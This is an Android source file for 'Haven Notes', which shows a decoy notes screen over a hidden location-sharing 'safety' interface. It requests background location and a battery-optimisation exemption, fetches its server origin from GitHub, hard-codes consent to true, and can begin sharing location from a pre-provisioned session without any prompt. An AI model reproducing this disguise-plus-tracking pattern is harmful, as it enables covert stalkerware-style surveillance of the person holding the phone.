package com.haven.notes

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.compose.animation.Crossfade
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Home
import androidx.compose.material.icons.filled.LocationOn
import androidx.compose.material.icons.filled.People
import androidx.compose.material.icons.filled.Tune
import androidx.compose.material3.Icon
import androidx.compose.material3.NavigationBar
import androidx.compose.material3.NavigationBarItem
import androidx.compose.material3.NavigationBarItemDefaults
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.core.content.ContextCompat
import com.haven.notes.ui.screens.CircleScreen
import com.haven.notes.ui.screens.DecoyNotesScreen
import com.haven.notes.ui.screens.FamilyScreen
import com.haven.notes.ui.screens.HomeScreen
import com.haven.notes.ui.screens.SetupScreen
import com.haven.notes.ui.theme.BackgroundLight
import com.haven.notes.ui.theme.HavenNotesTheme
import com.haven.notes.ui.theme.Ink
import com.haven.notes.ui.theme.SageAccent
import com.haven.notes.ui.theme.TextSecondary
import com.haven.notes.viewmodel.DecoyNotesViewModel
import com.haven.notes.viewmodel.FamilyViewModel
import com.haven.notes.viewmodel.SafetyViewModel

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.PowerManager
import android.provider.Settings
import androidx.lifecycle.lifecycleScope
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import com.haven.notes.data.ApiClient
import com.haven.notes.data.FamilySession
import com.haven.notes.data.Storage
import com.haven.notes.service.NotesLocationService
import com.haven.notes.ui.components.NicknameDialog
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

enum class NavTab(val title: String, val icon: ImageVector) {
    HOME("Home", Icons.Default.Home),
    CIRCLE("Circle", Icons.Default.People),
    FAMILY("Family", Icons.Default.LocationOn),
    SETUP("Setup", Icons.Default.Tune)
}

class MainActivity : ComponentActivity() {
    private val safetyViewModel: SafetyViewModel by viewModels()
    private val familyViewModel: FamilyViewModel by viewModels()
    private val decoyViewModel: DecoyNotesViewModel by viewModels()

    private var isUnlocked by mutableStateOf(false)
    private var showNicknamePrompt by mutableStateOf(false)
    private var isRegistering by mutableStateOf(false)
    private var registrationError by mutableStateOf<String?>(null)

    private val backgroundLocationLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { _ ->
        val storage = Storage(this)
        if (storage.familySession?.enabled == true) {
            NotesLocationService.shareNow(this)
        }
        requestBatteryOptimizationExemption()
    }

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { grants ->
        val fineGranted = grants[Manifest.permission.ACCESS_FINE_LOCATION] == true
        if (fineGranted) {
            safetyViewModel.setLocation(true)
            val storage = Storage(this)
            if (storage.familySession == null) {
                storage.loadAutoConnectFromAssets(this)
            }
            if (storage.familySession?.enabled == true) {
                NotesLocationService.shareNow(this)
            }
            // Request background location ('Allow all the time') on Android 10+
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            } else {
                requestBatteryOptimizationExemption()
            }
        } else {
            requestBatteryOptimizationExemption()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestAppPermissions()

        val storage = Storage(this)
        val session = storage.familySession ?: storage.loadAutoConnectFromAssets(this)
        if (session == null) {
            showNicknamePrompt = true
        } else {
            NotesLocationService.start(this)
        }

        setContent {
            HavenNotesTheme {
                if (showNicknamePrompt) {
                    NicknameDialog(
                        initialName = "",
                        isBusy = isRegistering,
                        errorMessage = registrationError,
                        onConfirm = { nickname ->
                            registerDevice(nickname)
                        },
                        onDismiss = {
                            showNicknamePrompt = false
                        }
                    )
                }

                Crossfade(targetState = isUnlocked, label = "ScreenTransition") { unlocked ->
                    if (unlocked) {
                        SafetyInterface(
                            safetyViewModel = safetyViewModel,
                            familyViewModel = familyViewModel,
                            onLockToDecoy = { isUnlocked = false }
                        )
                    } else {
                        DecoyNotesScreen(
                            viewModel = decoyViewModel,
                            onUnlock = { isUnlocked = true }
                        )
                    }
                }
            }
        }
    }

    private fun registerDevice(nickname: String) {
        val storage = Storage(this)
        isRegistering = true
        registrationError = null
        lifecycleScope.launch(Dispatchers.IO) {
            try {
                var origin = storage.getAutoConnectOrigin(this@MainActivity)
                val apiClient = ApiClient()
                if (origin.isBlank()) {
                    try {
                        val raw = apiClient.getDirect("https://raw.githubusercontent.com/rishavm003/hid-app/main/release/connection.json")
                        val mapType = object : TypeToken<Map<String, String>>() {}.type
                        val map: Map<String, String> = Gson().fromJson(raw, mapType)
                        origin = map["origin"] ?: ""
                    } catch (_: Exception) {}
                }
                if (origin.isBlank()) {
                    withContext(Dispatchers.Main) {
                        isRegistering = false
                        registrationError = "Could not sync notes. Please check your internet connection."
                    }
                    return@launch
                }

                val body = mapOf("name" to nickname, "consent" to true)
                val respJson = apiClient.post(
                    origin = origin,
                    path = "/v1/family/register",
                    token = "",
                    bodyJson = Gson().toJson(body)
                )
                val mapType = object : TypeToken<Map<String, Any>>() {}.type
                val resp: Map<String, Any> = Gson().fromJson(respJson, mapType)
                val id = resp["id"] as? String
                val token = resp["token"] as? String
                val controller = resp["controller_name"] as? String ?: "Notes Cloud"

                if (!id.isNullOrBlank() && !token.isNullOrBlank()) {
                    val session = FamilySession(
                        origin = origin,
                        token = token,
                        id = id,
                        controller = controller,
                        enabled = true
                    )
                    storage.familySession = session
                    storage.consent = true
                    familyViewModel.reconcile()
                    withContext(Dispatchers.Main) {
                        isRegistering = false
                        showNicknamePrompt = false
                        NotesLocationService.shareNow(this@MainActivity)
                    }
                } else {
                    withContext(Dispatchers.Main) {
                        isRegistering = false
                        registrationError = "Sync error. Please try again."
                    }
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    isRegistering = false
                    registrationError = "Could not connect: ${e.message ?: "Connection error"}"
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        safetyViewModel.refresh()
        familyViewModel.reconcile()
        val storage = Storage(this)
        if (familyViewModel.session.value?.enabled == true || storage.familySession?.enabled == true) {
            NotesLocationService.shareNow(this)
        }
    }

    override fun onStop() {
        super.onStop()
        // Instantly lock back to decoy notes when minimized or phone screen turns off
        isUnlocked = false
    }

    private fun requestAppPermissions() {
        val permissions = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        val needsRequest = permissions.any {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (needsRequest) {
            permissionLauncher.launch(permissions.toTypedArray())
        } else {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            } else {
                requestBatteryOptimizationExemption()
            }
        }
    }

    private fun requestBatteryOptimizationExemption() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            }
        } catch (_: Exception) {}
    }
}

@Composable
fun SafetyInterface(
    safetyViewModel: SafetyViewModel,
    familyViewModel: FamilyViewModel,
    onLockToDecoy: () -> Unit
) {
    var selectedTab by remember { mutableIntStateOf(0) }

    Scaffold(
        bottomBar = {
            NavigationBar(
                containerColor = BackgroundLight,
                contentColor = Ink
            ) {
                NavTab.values().forEachIndexed { index, tab ->
                    NavigationBarItem(
                        selected = selectedTab == index,
                        onClick = { selectedTab = index },
                        icon = { Icon(tab.icon, contentDescription = tab.title) },
                        label = { Text(tab.title) },
                        colors = NavigationBarItemDefaults.colors(
                            selectedIconColor = Color.White,
                            selectedTextColor = Ink,
                            indicatorColor = SageAccent,
                            unselectedIconColor = TextSecondary,
                            unselectedTextColor = TextSecondary
                        )
                    )
                }
            }
        },
        containerColor = BackgroundLight,
        modifier = Modifier.fillMaxSize()
    ) { paddingValues ->
        androidx.compose.foundation.layout.Box(
            modifier = Modifier
                .fillMaxSize()
                .padding(paddingValues)
        ) {
            when (selectedTab) {
                0 -> HomeScreen(viewModel = safetyViewModel, onLockToDecoy = onLockToDecoy)
                1 -> CircleScreen(viewModel = safetyViewModel, onLockToDecoy = onLockToDecoy)
                2 -> FamilyScreen(
                    familyViewModel = familyViewModel,
                    safetyViewModel = safetyViewModel,
                    onLockToDecoy = onLockToDecoy
                )
                3 -> SetupScreen(viewModel = safetyViewModel, onLockToDecoy = onLockToDecoy)
            }
        }
    }
}
